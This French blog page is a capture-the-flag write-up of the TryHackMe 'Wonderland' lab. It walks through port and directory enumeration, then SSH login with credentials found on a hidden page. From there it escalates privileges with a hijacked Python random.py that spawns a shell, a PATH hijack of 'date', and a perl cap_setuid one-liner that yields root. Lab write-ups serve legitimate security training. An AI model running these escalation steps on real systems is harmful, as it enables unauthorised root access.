<!doctype html><html lang=fr-fr dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Wonderlands
  
  #
  




Cette box suit le thème d'Alice au pays des merveilles. Comme d'habitude sur TryHackMe, il nous est fournit une adresse IP que nous allons commencer par scanner.

  Première approche avec Nmap
  
  #
  

Le scan nous montre que seuls 2 ports sont ouverts, donc nous aurons à priori un premier accès via un site web puis certainement un accès via SSH.
Starting Nmap 7.91 ( https://nmap.org ) at 2025-09-24 20:05 CEST
Nmap scan report for 10.10.186.97
Host is up (0.066s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.20 seconds

  Énumération des chemins
  
  #
  

Le site web est une page simple qui ne nous fournit pas de lien ni de formulaire. Nous allons donc lancer une énumération pour chercher d&rsquo;autres entrées."><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="//localhost:1313/docs/writeups/vm/collapsed/wonderlands/"><meta property="og:site_name" content="@camillegr"><meta property="og:title" content="Wonderlands"><meta property="og:description" content="Wonderlands # Cette box suit le thème d'Alice au pays des merveilles. Comme d'habitude sur TryHackMe, il nous est fournit une adresse IP que nous allons commencer par scanner. Première approche avec Nmap # Le scan nous montre que seuls 2 ports sont ouverts, donc nous aurons à priori un premier accès via un site web puis certainement un accès via SSH.
Starting Nmap 7.91 ( https://nmap.org ) at 2025-09-24 20:05 CEST Nmap scan report for 10.10.186.97 Host is up (0.066s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA) | 256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA) |_ 256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Follow the white rabbit. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.20 seconds Énumération des chemins # Le site web est une page simple qui ne nous fournit pas de lien ni de formulaire. Nous allons donc lancer une énumération pour chercher d’autres entrées."><meta property="og:locale" content="fr_fr"><meta property="og:type" content="article"><meta property="article:section" content="docs"><title>Wonderlands | @camillegr</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=//localhost:1313/docs/writeups/vm/collapsed/wonderlands/><link rel=stylesheet href=/book.min.bb3e87f07d36c204e64f36f7b234cbfca24038b4a3f644b253b84740bc8ac74b.css integrity="sha256-uz6H8H02wgTmTzb3sjTL/KJAOLSj9kSyU7hHQLyKx0s=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.93d6633a78dacfa6129026b437f37946ad7e9d6f7fe46845365e41653b480082.js integrity="sha256-k9ZjOnjaz6YSkCa0N/N5Rq1+nW9/5GhFNl5BZTtIAII=" crossorigin=anonymous></script></head><body dir=ltr class="book-kind-page book-type-docs"><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>@camillegr</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-ad93f8b4ee98a57a6224ee06f39153b9 class=toggle>
<label for=section-ad93f8b4ee98a57a6224ee06f39153b9 class=flex><a role=button class=flex-auto>Projets Personnels</a></label><ul><li><a href=/docs/projets/collapsed/tofuzz/>ToFuzz</a></li></ul></li><li><input type=checkbox id=section-72538655c7e4bb37bc80c6f43d7e4b3b class=toggle checked>
<label for=section-72538655c7e4bb37bc80c6f43d7e4b3b class=flex><a href=/docs/writeups/ class=flex-auto>Writeups</a></label><ul><li><input type=checkbox id=section-14ed21d169f82c1f4e9784c42f27b9c3 class=toggle>
<label for=section-14ed21d169f82c1f4e9784c42f27b9c3 class=flex><a href=/docs/writeups/rootmepro2025/ class=flex-auto>CTF 2025 | Root-Me Pro x DGSE</a></label><ul><li><a href=/docs/writeups/rootmepro2025/collapsed/mission1/>Mission 1 - IA</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission2/>Mission 2 - SOC</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission3/>Mission 3 - Forensic</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission4/>Mission 4 - Pentest</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission5/>Mission 5 - Mobile</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission6/>Mission 6 - OSINT</a></li></ul></li><li><input type=checkbox id=section-661913a3e27635165633fb2069bf836f class=toggle checked>
<label for=section-661913a3e27635165633fb2069bf836f class=flex><a href=/docs/writeups/vm/ class=flex-auto>Virtual Machines</a></label><ul><li><a href=/docs/writeups/vm/collapsed/mrrobot/>Mr Robot</a></li><li><a href=/docs/writeups/vm/collapsed/rootme/>RootMe</a></li><li><a href=/docs/writeups/vm/collapsed/wonderlands/ class=active>Wonderlands</a></li></ul></li></ul></li><li class=book-section-flat><span>Divers</span><ul><li><a href=/docs/divers/blogs/>Blogs</a></li></ul></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Wonderlands</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#première-approche-avec-nmap>Première approche avec Nmap</a></li><li><a href=#énumération-des-chemins>Énumération des chemins</a></li><li><a href=#premier-accès-ssh>Premier accès SSH</a><ul><li><a href=#premier-drapeau>Premier drapeau</a></li><li><a href=#enumeration-des-droits>Enumeration des droits</a></li></ul></li><li><a href=#library-hijacking>Library Hijacking</a></li><li><a href=#corruption-du-path>Corruption du Path</a></li><li><a href=#getcap-hatter>getcap hatter</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=wonderlands>Wonderlands
<a class=anchor href=#wonderlands>#</a></h1><center><img src=../img/wonderlands_illu.png width=300pct></center>Cette box suit le thème d'Alice au pays des merveilles. Comme d'habitude sur TryHackMe, il nous est fournit une adresse IP que nous allons commencer par scanner.<h2 id=première-approche-avec-nmap>Première approche avec Nmap
<a class=anchor href=#premi%c3%a8re-approche-avec-nmap>#</a></h2><p>Le scan nous montre que seuls 2 ports sont ouverts, donc nous aurons à priori un premier accès via un site web puis certainement un accès via SSH.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2025-09-24 20:05 CEST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.186.97
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.066s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed ports
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Golang net/http server <span style=color:#f92672>(</span>Go-IPFS json-rpc or InfluxDB API<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Follow the white rabbit.
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 30.20 seconds
</span></span></code></pre></div><h2 id=énumération-des-chemins>Énumération des chemins
<a class=anchor href=#%c3%a9num%c3%a9ration-des-chemins>#</a></h2><p>Le site web est une page simple qui ne nous fournit pas de lien ni de formulaire. Nous allons donc lancer une énumération pour chercher d&rsquo;autres entrées.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./gobuster dir -u http://10.10.186.97/ -w ../Wordlists/DirBuster-2007_directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.186.97/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                ../Wordlists/DirBuster-2007_directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2025/09/24 20:20:32 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/img                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; img/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/r                    <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; r/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/poem                 <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; poem/<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Nous avons pour commencer plusieurs dossiers :</p><ul><li><strong>/img</strong> contient les images</li><li><strong>/poem</strong> ne répond pas</li><li><strong>/r</strong> contient une autre page web, sans lien, mais avec un extrait d&rsquo;Alice au pays des merveilles. Nous allons lancer un autre scan en partant de ce dossier.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./gobuster dir -u http://10.10.186.97/r/ -w ../Wordlists/DirBuster-2007_directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.186.97/r/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                ../Wordlists/DirBuster-2007_directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2025/09/24 20:30:01 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/a                    <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; a/<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>On trouve un autre dossier &lsquo;&rsquo;&rsquo;/a&rsquo;&rsquo;&rsquo;, le début de rabbit. Nous essayons donc le chemin /r/a/b/b/i/t et on tombe sur une page web qui nous fournit un identifiant et un mot de passe à utiliser en SSH.</p><p><img src=../img/wonderlands_burp.png alt=image.png></p><p><strong>alice:HowDothTheLittleCrocodileImproveHisShiningTail</strong></p><h2 id=premier-accès-ssh>Premier accès SSH
<a class=anchor href=#premier-acc%c3%a8s-ssh>#</a></h2><h3 id=premier-drapeau>Premier drapeau
<a class=anchor href=#premier-drapeau>#</a></h3><p>On observe un fichier root.txt dans le dossier de alice. Ce fichier ne devrait pas être là. Après avoir honteusement demandé un indice à TryHackMe (il faut être honnête), TryHackMe nous dit &ldquo;Everything is upside down&rdquo;.</p><p>C&rsquo;est logique : si root.txt est dans alice, alors user.txt est dans root.. et on trouve le drapeau /root/user.txt.</p><h3 id=enumeration-des-droits>Enumeration des droits
<a class=anchor href=#enumeration-des-droits>#</a></h3><p>Revenons à notre box : l&rsquo;énumération des droits sudo nous montre qu&rsquo;il est possible de lancer un script python avec l&rsquo;utilisateur rabbit :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>alice@wonderland:~$ sudo -l
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> alice:
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> alice on wonderland:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User alice may run the following commands on wonderland:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>rabbit<span style=color:#f92672>)</span> /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
</span></span></code></pre></div><h2 id=library-hijacking>Library Hijacking
<a class=anchor href=#library-hijacking>#</a></h2><p>En observant le script, on s&rsquo;aperçoit que celui-ci importe random.py, on va donc créer dans le dossier courant une fausse librairie random.py pour exécuter du code arbitrairement.</p><p>On implante donc random.py dans le dossier d’alice :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># random.py</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os; os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>)
</span></span></code></pre></div><p>Et on exécute le script avec l&rsquo;utilisateur rabbit :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo -u rabbit python3.6 /home/alice/walrus_and_the_carpenter.py
</span></span></code></pre></div><p>En executant on a un shell avec rabbit.</p><h2 id=corruption-du-path>Corruption du Path
<a class=anchor href=#corruption-du-path>#</a></h2><p>L&rsquo;utilisateur rabbit ne nous permet pas de lire le fichier root, mais en regardant dans le dossier de rabbit on trouve un executable.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rabbit@wonderland:/home/rabbit$ ./teaParty
</span></span><span style=display:flex><span>Welcome to the tea party!
</span></span><span style=display:flex><span>The Mad Hatter will be here soon.
</span></span><span style=display:flex><span>Probably by Wed, <span style=color:#ae81ff>25</span> Sep <span style=color:#ae81ff>2025</span> 21:07:36 +0000
</span></span><span style=display:flex><span>Ask very nicely, and I will give you some tea <span style=color:#66d9ef>while</span> you wait <span style=color:#66d9ef>for</span> him
</span></span><span style=display:flex><span>please
</span></span><span style=display:flex><span>Segmentation fault <span style=color:#f92672>(</span>core dumped<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>on observe deux choses :</p><ul><li>teaParty a un UID, ce qui veut dire qu&rsquo;il s&rsquo;exécute certainement avec un autre utilisateur.</li><li>la chaîne &ldquo;Wed, 25 Sep 2025 21:07:36 +0000&rdquo; ressemble beaucoup à la sortie de la commande date.</li></ul><p>On va donc essayer de corrompre le path pour modifier l&rsquo;exécution de date par /usr/bin/id.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ head -1 /tmp/date &gt; /tmp/date
</span></span><span style=display:flex><span>$ echo <span style=color:#e6db74>&#34;/usr/bin/id&#34;</span> &gt;&gt; /tmp/date
</span></span><span style=display:flex><span>$ PATH<span style=color:#f92672>=</span>/tmp
</span></span><span style=display:flex><span>$ ./teaParty
</span></span><span style=display:flex><span>Welcome to the tea party!
</span></span><span style=display:flex><span>The Mad Hatter will be here soon.
</span></span><span style=display:flex><span>Probably by uid<span style=color:#f92672>=</span>1003<span style=color:#f92672>(</span>hatter<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>rabbit<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>rabbit<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Ask very nicely, and I will give you some tea <span style=color:#66d9ef>while</span> you wait <span style=color:#66d9ef>for</span> him
</span></span></code></pre></div><p>On a bien une modification de date par id : on change <code>/usr/bin/id</code> dans <code>/tmp/date</code> par <code>/bin/bash</code> et on obtient un shell avec hatter.</p><h2 id=getcap-hatter>getcap hatter
<a class=anchor href=#getcap-hatter>#</a></h2><p>hatter a un fichier password.txt contenant son mot de passe, on utilise ce mot de passe pour créer une session propre.hatter n&rsquo;a pas de droit sudo, et on ne trouve pas de binaire avec des suid intéressant. On liste les capabilities :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hatter@wonderland:~$ getcap -r / 2&gt;/dev/null
</span></span><span style=display:flex><span>/usr/bin/perl5.26.1 <span style=color:#f92672>=</span> cap_setuid+ep
</span></span><span style=display:flex><span>/usr/bin/mtr-packet <span style=color:#f92672>=</span> cap_net_raw+ep
</span></span><span style=display:flex><span>/usr/bin/perl <span style=color:#f92672>=</span> cap_setuid+ep
</span></span></code></pre></div><p>On observe également que perl appartient au groupe hatter :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>alice@wonderland:~$ ls -l /usr/bin | grep hatter
</span></span><span style=display:flex><span>-rwxr-xr-- <span style=color:#ae81ff>2</span> root   hatter   <span style=color:#ae81ff>2097720</span> Nov <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2018</span> perl
</span></span><span style=display:flex><span>-rwxr-xr-- <span style=color:#ae81ff>2</span> root   hatter   <span style=color:#ae81ff>2097720</span> Nov <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2018</span> perl5.26.1
</span></span></code></pre></div><p>On peut alors faire une escalade de privilège et trouver le dernier drapeau :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hatter@wonderland:~$ /usr/bin/perl -e <span style=color:#e6db74>&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/sh&#34;;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># id</span>
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1003<span style=color:#f92672>(</span>hatter<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1003<span style=color:#f92672>(</span>hatter<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># cat /home/alice/root.txt</span>
</span></span><span style=display:flex><span>thm<span style=color:#f92672>{</span>XXXXXXX, XXXXXXX, XXXXXX XXX! XXX X XXXXX XXXX XXXXXX XX<span style=color:#f92672>}</span>
</span></span></code></pre></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><div class="flex flex-wrap justify-between"><span><a href=/docs/writeups/vm/collapsed/rootme/ class="flex align-center book-icon"><img src=/svg/backward.svg class=book-icon alt=Previous title=RootMe>
<span>RootMe</span>
</a></span><span><a href=/docs/divers/blogs/ class="flex align-center book-icon"><span>Blogs</span>
<img src=/svg/forward.svg class=book-icon alt=Next title=Blogs></a></span></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#première-approche-avec-nmap>Première approche avec Nmap</a></li><li><a href=#énumération-des-chemins>Énumération des chemins</a></li><li><a href=#premier-accès-ssh>Premier accès SSH</a><ul><li><a href=#premier-drapeau>Premier drapeau</a></li><li><a href=#enumeration-des-droits>Enumeration des droits</a></li></ul></li><li><a href=#library-hijacking>Library Hijacking</a></li><li><a href=#corruption-du-path>Corruption du Path</a></li><li><a href=#getcap-hatter>getcap hatter</a></li></ul></nav></div></aside></main></body></html>